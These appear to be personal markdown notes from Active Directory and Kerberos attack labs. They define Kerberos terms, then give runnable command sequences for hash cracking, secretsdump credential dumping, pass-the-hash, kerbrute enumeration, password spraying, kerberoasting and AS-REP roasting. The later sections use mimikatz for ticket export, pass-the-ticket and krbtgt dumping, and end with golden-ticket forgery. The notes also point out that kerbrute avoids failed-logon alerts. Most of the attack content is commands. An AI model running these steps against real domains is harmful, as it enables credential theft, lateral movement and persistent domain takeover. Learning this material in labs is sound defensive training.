# ATTACKTIV DIRECTORY		
## CRACK THE HASH
The one i got in this case was : Kerberos 5 AS-REP etype 23
```bash	
hashcat -a 0 -m 18200 hash /usr/share/wordlists/rockyou.txt --force 
```
## ENUM SHARES WITH SMBCLIENT
```bash
smbclient -L 10.10.72.208 --user svc-admin
```
	
## LOG INTO SHARES WITH SMBCLIENT
```bash
smbclient \\\\spookysec.local\\backup --user svc-admin
```
- spookysec.local can also be the IP address
- admin is a valid user and we have his password

## ENUM FOR ADDITIONNAL INFORMATIONS WITH secretdump.py
(Admit that we have password for the user backup)
```bash
secretsdump.py -just-dc backup@spookysec.local
```
	
## LOG IN WITH PSEXEC BY "PASSING THE HASH"
```bash
psexec.py -hashes PUT_THE:HASH_HERE administrator@spookysec.local
get cmd
```

## LOG IN WITH EVIL-WINRM BY "PASSING THE HASH"
```bash
evil-winrm -u administrator -H PUT_THE_HASH_HERE -i spookysec.local
```
- /!\ This only needs the second part of the NTLM hash
- get powershell
	


# KERBEROAST
# Definitions : 
## TGS : Ticket Granting Service
- Used by the KDC
- It take a TGT and return a ticket to a machine on the domain

## TGT : Ticket Granting Ticket
- Authentication ticket
- used to request service tickets from the TGS

## KRBTGT : 
- Those are like golden TGTs, they allow to get access to every TGS

## KDC Key Distribution Center
- Service for issuing TGT and service tickets that consist of the Authentication Service and the Ticket Granting Service.
- Constituted by AS and TGS

## AS : Authentication service
- It issues TGTs to be used by the TGS in the domain to request access to other machines and service tickets

## SPN : Service Principal Name
- It's an identifier given to a service instance to associate a service instance with a domain service account

## KDC Long Terme Secret Key (KDC LT Key)
- The KDC key is based on the KRBTGT service account. It is used to encrypt the TGT and sign the PAC.

## Client Long Term Secret Key (Client LT Key)
- The client key is based on the computer or service account. 
- It is used to check the encrypted timestamp and encrypt the session key.

## Service Long Term Secret Key (Service LT Key) 
- The service key is based on the service account. 
- It is used to encrypt the service portion of the service ticket and sign the PAC.

## Session Key 
- Issued by the KDC when a TGT is issued. 
- The user will provide the session key to the KDC along with the TGT when requesting a service ticket.

## Privilege Attribute Certificate (PAC) 
- The PAC holds all of the user's relevant information, it is sent along with the TGT to the KDC to be signed by the Target LT Key and the KDC LT Key in order to validate the user.

## Local Security Authority Subsystem Service (LSASS)
 It's a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. 

# AS-REQ // PRE-AUTHENTICATION

The steps required for the authentication are always the same (steps are followed by the KDC)  
- It starts when a user request a TGT from the KDC
- The user encrypt a timestamp NT hash and send it to the authentication service
- The KDC attempt to decrypt the timestamp using the NT hash from the user
- if successful, KDC will create a TGT and return it to the user

# TGT Content

- After the pre-authentication, the user has the first TGT
- The user send his TGT to the KDC to validate it and get a service ticket

So, the TGT is encrypted using the KDC LT Key and contains :
- ***Start/End/Max Renew:***05/29/2020:1:36;05/29/2020:11h36;...
- ***Service name***:krbtgt:example.local
- ***Target name***:krbtgt:example.local
- ***Client name***:user;example.local
- ***some flags***:00e00000
- ***Session key***:00x000000 12eb212...
In the other hand, it has 
- ***PAC (Username & SID)***

The TGT is signed with Service LT Key and the KDC LT Key

# TGS Content
In this type of ticket, we can see two parts : 

### User portion : 
- This portion is encrypted using the session key
This portion contains : 
- The timestamp of the ticket
- The Sessions Key

### Service portion : 
- This portion is also encrypted using the Session Key
This portion contains : 
- the PAC (Username & SID)

# KERBEROS AUTHENTICATION

["Kerberos authentication"](images/kerberos_authentication.png "Kerberos Authentication")


1) The client request a TGT  
2) The KDC returns an encrypted TGT  
3) The client send the encrypted TGT to the Ticket Granting Server and the SPN of the desired service  
4) The KDC verify the the TGT and permissions, it return a valid session key for the service to the client  
5) The client requests the service and sends the session key as a proof of permission  
6) The service grants access  

# KERBEROS TICKET OVERVIEW
TGTs can come with various form such as .kirbi (Used by Rubeus) or .ccache (for Impacket).  
Those tickets are b64 encoded.  
TGTs are only used in order to receive a TGS



# ATTACK PRIVILEGE REQUIREMENT

- Kerbrute Enumeration - No domain access required 
- Pass the Ticket - Access as a user to the domain required
- Kerberoasting - Access as any user required
- AS-REP Roasting - Access as any user required
- Golden Ticket - Full domain compromise (domain admin) required 
- Silver Ticket - Service hash required 
- Skeleton Key - Full domain compromise (domain admin) required


# ENUMERATION / KERBRUTE

***/!\ You need to add the DNS domain name along with the machine IP to /etc/hosts***

### ABUSING PRE-AUHTENTICATION
Notice that bruteforcing with kerbrute doesn't trigger the account failed to log on event which can throw up ref flags to blue team ! 

Kerbrute : https://github.com/ropnop/kerbrute/releases

##### ENUM USERS
```bash
kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local userlist.txt
```
# RUBEUS OVERVIEW

Rubeus has a wide variety of attacks and features that allow it to be a very versatile tool for attacking Kerberos. Just some of the many tools and attacks include overpass the hash, ticket requests and renewals, ticket management, ticket extraction, harvesting, pass the ticket, AS-REP Roasting, and Kerberoasting.

The tool has way too many attacks and features for me to cover all of them so I'll be covering only the ones I think are most crucial to understand how to attack Kerberos however I encourage you to research and learn more about Rubeus and its whole host of attacks and features here - https://github.com/GhostPack/Rubeus


# Harvesting & Brute-Forcing Tickets / RUBEUS


***/!\ This require to ssh or rdp into the machine***
This also require to have Rubeus installed in the machine

#### Harvesting tickets 
Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

The following payload will tells Rubeus to harvest TGT every 30s
```cmd
Rubeus.exe harvest /interval:30
```

#### Brute-Forcing / Password-Spraying
***Brute-Forcing***:Try a bunch of password for one user account
***Password-Spaying***:Try one password for a bunch of known user account

Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. 
```cmd
echo IP DOMAINNAME.local >> C:\Windows\System32\drivers\etc\hosts
```
Since we are logged into the machine, the following command will find every user account and spray the given password against them all.
```cmd
Rubeus.exe brute /password:Password1 /noticket
```
If there is a match, it will return the .kirbi TGT for that user, it looks like that : 
[sortie_spray_kerbrute](images/sortie_spray_kerbrute.png)


# KERBEROASTING / RUBEUS & IMPACKET
***Most popular Kerberos attack***
Kerberoasting allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password

To find account those are Kerberoastable, we can use BloodHound (I will try it another time)
#### WITH RUBEUS
This is used from the remote machine
The following command line will dump Kerberos hash and return any kerberoastable users
```cmd
Rubeus.exe kerberoast
```
- We can now copy the hash to our machine and crack it with : 
be careful of spaces and /n when copy-pasting
```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

#### WITH IMPACKET
This is used from our local machine and it's require to have a valid username and password credentials
This following command line will dump Kerberos hashes and return any kerberoastable users
```bash
GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.74.147 -request
```

- We can now copy the hash to our machine and crack it with : 
be careful of spaces and /n when copy-pasting
```bash
hashcat -m 13100 -a 0 hash.txt Pass.txt
```

## What Can a Service Account do?

- There are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not.
- If the service account is a domain admin, we can dump NTDS.dit.
- If the service account isn't a domain admin, we can escalate privileges or even spray passwords the password against other accounts

## Mitigation
- Strong passwords (As always -_-)
- Don't make services accounts domain admins

# AS-REP ROASTING / RUBEUS

 AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.  
- This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.
 ```bash
 Rubeus.exe asreproast 
 ```

***Be careful, you need to add 23$ after $krb5asrep$***
(To me, it seems to work even less 23$)

Then, crack the hash
```bash
hashcat -m 18200 hash.txt Pass.txt
```

# PASS THE TICKET (PTT)/ MIMIKATZ

## OVERWIEW
Mimikatz is well known to be a great tool to dump credentials from AD but it cans also be useful to dump tickets in Kerberos

### How 'Pass the ticket' works
1) Mimikatz dumps the TGT from LSASS (it will gives a .kirbi ticket)
2) Pass the ticket and acts as it's original owner

## PREPARE MIMIKATZ & DUMP THE TiCKET
```cmd
mimikatz.exe
privilege::debug
```
Ensure this output is '20'OK
If it doesn't, it means that you don't have admin privileges
```cmd
sekurlsa::tickets /export
```
This will export the ticket (.kirbi) to the directory you're in
***At this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier we harvested earlier***

## PASS THE TICKET
If you leave mimikatz, you will see that there are tickets in the directory. 
Copy the one that is interesting for you and return to mimiktatz
```cmd 
mimikatz.exe
```
This will cache the ticket and impersonate it
```cmd
kerberos::ptt [0;193f8c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
```
- The ticket is like : [0;193f8c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
- The output should be "* File : <Stuff> OK"
Let's just verify that it works by listing all cached tickets
You need to exit mimikatz so :
```cmd
exit
```
and
```cmd
klist
```

We now have impersonnated the ticket and have the same rights 
We can now list the admin$ share
```cmd
dir \\IP\admin$
```

# GOLDEN/SILVER TICKETS ATTACKS / MIMIKATZ
Mimikatz is also known to be a great tool to create Golden and Silver tickets
Silver tickets are stealther than the golden ones but quite less powerfull

In order to create a golden ticket, we need the KRBTGT = service account that create TGT with KDC  
In order to create a silver ticket, we only need any accessible account that can log into the desired service

## DUMP THE KRBTGT HASH
Starts mimikatz : 
```cmd
privilege::debug 
```
- ensure this outputs [privilege '20' ok] : 
```cmd
privilege::debug 
```
```cmd
lsadump::lsa /inject /name:krbtgt 
```
- This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.

The output will be useful for the next step :
["Mimikatz"](images/mimikatz_lsadump.png)

## CREATE THE GOLDEN TICKET
```cmd
Kerberos::golden /user:Administrator /domain:CONTROLLER.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500
```

- Administrator : The username
- domain : The domain controller name
- SID : the second part of the first line from the output
- krbtgt : the primary NTLM hash
- id : 500 -> idk what is that

## USE THE GOLDEN TICKET
```cmd 
misc::cmd
```